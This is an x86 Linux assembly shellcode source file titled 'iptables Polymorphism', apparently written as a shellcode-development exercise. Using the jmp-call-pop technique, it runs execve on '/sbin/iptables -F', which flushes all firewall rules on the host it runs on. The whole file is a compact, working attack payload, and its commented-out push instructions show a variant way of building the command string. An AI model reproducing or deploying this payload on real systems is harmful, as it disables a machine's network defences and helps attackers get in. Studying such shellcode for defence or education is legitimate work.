;Author: Ymir F. Eboras
;iptables Polymorphism


global _start

section .text

_start:

	jmp short call_command

command:
        
	;push dword 0x73656c62          ;bles
  	;push dword 0x61747069          ;ipta
	;push dword 0x2f6e6962          ;bin/
        ;push dword 0x732f2f2f          ;///s
	pop esi
	
	xor ebx, ebx         
	;push word 0x462d		;-F
  	mov byte [esi +17], bl   
	mov dword [esi +18], esi
 	mov dword [esi +22], ebx

        
	lea ebx, [esi]
        lea ecx, [esi +18]
        lea edx, [esi +22]
	
	xor eax, eax
	mov al, 0xb
	int 0x80

call_command:

	call command
	cmd db "/sbin/iptables -FABBBBCCCC"
